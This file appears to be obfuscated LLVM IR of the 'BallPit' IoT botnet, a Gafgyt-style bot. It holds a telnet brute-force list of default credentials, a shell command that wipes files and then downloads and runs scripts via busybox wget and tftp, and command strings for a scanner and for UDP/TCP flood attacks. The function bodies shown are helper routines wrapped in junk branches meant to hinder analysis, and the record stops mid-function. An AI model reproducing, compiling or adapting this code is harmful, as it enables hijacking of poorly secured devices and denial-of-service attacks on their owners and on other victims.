; ModuleID = 'host/ir_bcf/BallPit.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"cisco\00\00", align 1
@passwords = global [16 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.71 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.17 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.18 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.19 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.21 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.24 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.26 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.28 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.30 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [214 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http:///.sh; sh .sh; wget1 http:///.sh; sh .sh; busybox tftp -r tftp.sh -g ; sh tftp.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.34 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.35 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.38 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.40 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.42 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.45 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.46 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.47 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.49 = private unnamed_addr constant [18 x i8] c"SCANNER STOPPED!\0A\00", align 1
@.str.50 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.51 = private unnamed_addr constant [18 x i8] c"SCANNER STARTED!\0A\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.56 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.57 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.58 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.59 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"ART OF WAR\00", align 1
@.str.62 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.64 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.69 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.70 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %47, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %50

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* @x
  %15 = load i32, i32* @y
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = load i32, i32* %3, align 4
  %23 = sub nsw i32 %22, 3
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %24
  %26 = load i32, i32* %25, align 4
  %27 = load i32, i32* %3, align 4
  %28 = sub nsw i32 %27, 2
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = xor i32 %26, %31
  %33 = xor i32 %32, -1640531527
  %34 = load i32, i32* %3, align 4
  %35 = xor i32 %33, %34
  %36 = load i32, i32* %3, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  store i32 %35, i32* %38, align 4
  %39 = load i32, i32* @x
  %40 = load i32, i32* @y
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %10

; <label>:50:                                     ; preds = %10
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %13
  %51 = load i32, i32* %3, align 4
  %_ = sub i32 %51, 3
  %gen = mul i32 %_, 3
  %_1 = sub i32 0, %51
  %gen2 = add i32 %_1, 3
  %_3 = sub i32 %51, 3
  %gen4 = mul i32 %_3, 3
  %_5 = sub i32 0, %51
  %gen6 = add i32 %_5, 3
  %_7 = sub i32 0, %51
  %gen8 = add i32 %_7, 3
  %52 = sub nsw i32 %51, 3
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = load i32, i32* %3, align 4
  %_9 = sub i32 %56, 2
  %gen10 = mul i32 %_9, 2
  %_11 = sub i32 %56, 2
  %gen12 = mul i32 %_11, 2
  %_13 = shl i32 %56, 2
  %_14 = shl i32 %56, 2
  %57 = sub nsw i32 %56, 2
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %58
  %60 = load i32, i32* %59, align 4
  %_15 = sub i32 %55, %60
  %gen16 = mul i32 %_15, %60
  %_17 = sub i32 0, %55
  %gen18 = add i32 %_17, %60
  %_19 = sub i32 0, %55
  %gen20 = add i32 %_19, %60
  %_21 = sub i32 0, %55
  %gen22 = add i32 %_21, %60
  %_23 = sub i32 %55, %60
  %gen24 = mul i32 %_23, %60
  %_25 = shl i32 %55, %60
  %_26 = sub i32 0, %55
  %gen27 = add i32 %_26, %60
  %_28 = sub i32 0, %55
  %gen29 = add i32 %_28, %60
  %61 = xor i32 %55, %60
  %_30 = shl i32 %61, -1640531527
  %_31 = sub i32 %61, -1640531527
  %gen32 = mul i32 %_31, -1640531527
  %62 = xor i32 %61, -1640531527
  %63 = load i32, i32* %3, align 4
  %_33 = sub i32 0, %62
  %gen34 = add i32 %_33, %63
  %_35 = shl i32 %62, %63
  %_36 = shl i32 %62, %63
  %_37 = sub i32 0, %62
  %gen38 = add i32 %_37, %63
  %_39 = shl i32 %62, %63
  %_40 = sub i32 %62, %63
  %gen41 = mul i32 %_40, %63
  %_42 = sub i32 %62, %63
  %gen43 = mul i32 %_42, %63
  %64 = xor i32 %62, %63
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  store i32 %64, i32* %67, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* @x.1
  %36 = load i32, i32* @y.2
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = load i32, i32* %3, align 4
  %45 = sub i32 %43, %44
  %46 = load i32, i32* @rand_cmwc.i, align 4
  %47 = zext i32 %46 to i64
  %48 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %47
  store i32 %45, i32* %48, align 4
  %49 = load i32, i32* @x.1
  %50 = load i32, i32* @y.2
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %45

originalBBalteredBB:                              ; preds = %originalBB, %34
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %_ = shl i32 %57, %58
  %_1 = sub i32 0, %57
  %gen = add i32 %_1, %58
  %_2 = sub i32 0, %57
  %gen3 = add i32 %_2, %58
  %59 = sub i32 %57, %58
  %60 = load i32, i32* @rand_cmwc.i, align 4
  %61 = zext i32 %60 to i64
  %62 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %61
  store i32 %59, i32* %62, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %35, %1
  %11 = load i32, i32* @x.3
  %12 = load i32, i32* @y.4
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i8*, i8** %2, align 8
  %20 = load i32, i32* %4, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = call i32 @isspace(i32 %24) #10
  %26 = icmp ne i32 %25, 0
  %27 = load i32, i32* @x.3
  %28 = load i32, i32* @y.4
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %4, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %4, align 4
  br label %10

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i32, i32* @x.3
  %40 = load i32, i32* @y.4
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* @x.3
  %48 = load i32, i32* @y.4
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %55

; <label>:55:                                     ; preds = %originalBBpart215, %originalBBpart24
  %56 = load i32, i32* @x.3
  %57 = load i32, i32* @y.4
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = load i32, i32* %5, align 4
  %65 = load i32, i32* %4, align 4
  %66 = icmp sge i32 %64, %65
  %67 = load i32, i32* @x.3
  %68 = load i32, i32* @y.4
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %66, label %75, label %84

; <label>:75:                                     ; preds = %originalBBpart28
  %76 = load i8*, i8** %2, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = call i32 @isspace(i32 %81) #10
  %83 = icmp ne i32 %82, 0
  br label %84

; <label>:84:                                     ; preds = %75, %originalBBpart28
  %85 = phi i1 [ false, %originalBBpart28 ], [ %83, %75 ]
  br i1 %85, label %86, label %105

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* @x.3
  %88 = load i32, i32* @y.4
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %86
  %95 = load i32, i32* %5, align 4
  %96 = add nsw i32 %95, -1
  store i32 %96, i32* %5, align 4
  %97 = load i32, i32* @x.3
  %98 = load i32, i32* @y.4
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart215, label %originalBB10alteredBB

originalBBpart215:                                ; preds = %originalBB10
  br label %55

; <label>:105:                                    ; preds = %84
  %106 = load i32, i32* %4, align 4
  store i32 %106, i32* %3, align 4
  br label %107

; <label>:107:                                    ; preds = %123, %105
  %108 = load i32, i32* %3, align 4
  %109 = load i32, i32* %5, align 4
  %110 = icmp sle i32 %108, %109
  br i1 %110, label %111, label %126

; <label>:111:                                    ; preds = %107
  %112 = load i8*, i8** %2, align 8
  %113 = load i32, i32* %3, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = load i8*, i8** %2, align 8
  %118 = load i32, i32* %3, align 4
  %119 = load i32, i32* %4, align 4
  %120 = sub nsw i32 %118, %119
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %117, i64 %121
  store i8 %116, i8* %122, align 1
  br label %123

; <label>:123:                                    ; preds = %111
  %124 = load i32, i32* %3, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %3, align 4
  br label %107

; <label>:126:                                    ; preds = %107
  %127 = load i32, i32* @x.3
  %128 = load i32, i32* @y.4
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
